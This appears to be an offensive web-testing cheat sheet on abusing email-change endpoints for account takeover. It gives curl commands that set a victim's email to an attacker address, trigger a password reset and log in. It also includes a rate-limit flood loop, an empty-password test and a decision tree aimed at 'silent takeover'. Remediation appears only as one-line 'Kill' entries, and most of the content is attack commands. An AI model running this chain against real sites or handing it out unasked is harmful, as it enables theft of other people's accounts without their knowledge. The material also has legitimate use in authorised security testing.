# EMAIL CHANGE ABUSE — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **No Verification** | Email change no OTP | `curl -X PATCH /api/profile -d '{"email":"attacker@evil.com"}'` | Email changed without confirming old | "confirm current email" |
| **Steal Another's Email** | No ownership check | `curl -X PATCH /api/profile -d '{"email":"victim@gmail.com"}'` | Now logging in as victim triggers password reset | Email uniqueness check |
| **Reset After Change** | Password reset accepts new email | Change email → `curl -X POST /api/password-reset -d '{"email":"attacker@evil.com"}'` | Reset link sent to attacker | "Check old email first" |
| **No Notification** | No email sent to old address | Change email, check old address inbox | No "your email changed" notice | Notification always sent |
| **Rate Limit** | Multiple email changes | `for i in {1..100}; do curl -X PATCH /api/email -d "email=test$i@x.com"; done` | All succeed, no rate limit | "too many requests" |

## CURL COMMANDS
```bash
# ATO chain via email change
# Step 1: Change victim's email to yours
curl -X PATCH /api/user/email -H "Cookie: VICTIM_SESSION" \
  -d '{"email":"attacker@evil.com"}'

# Step 2: Request password reset to your email
curl -X POST /api/auth/forgot-password \
  -d '{"email":"attacker@evil.com"}'

# Step 3: Check your inbox, use reset link, set new password
# Step 4: Login with attacker@evil.com + new password
# → FULL ATO

# Check if current email must be confirmed
curl -v -X PUT /api/account/email -H "Cookie: A" \
  -H "Content-Type: application/json" \
  -d '{"new_email":"new@test.com","current_password":""}'  # Try with empty password
```

## DECISION TREE
```
Found email change endpoint?
├─ Can change without verifying old email?
│  ├─ Yes → EMAIL TAKEOVER (change to attacker's email, reset password)
│  └─ No → OTP sent, need confirmation
├─ Can change to another user's email?
│  ├─ Yes → ACCOUNT THEFT (take over any account)
│  └─ No → email uniqueness check
├─ Password reset uses new email?
│  ├─ Yes → FULL ATO CHAIN (change email → reset → login)
│  └─ No → reset tied to original email
└─ Notification sent to old email?
   ├─ No → SILENT TAKEOVER (victim never knows)
   └─ Yes → alert raised
```

## CHAIN
Email Change + Password Reset = Full ATO (email change → reset → login)
Email Change + No Notification = Silent Account Takeover
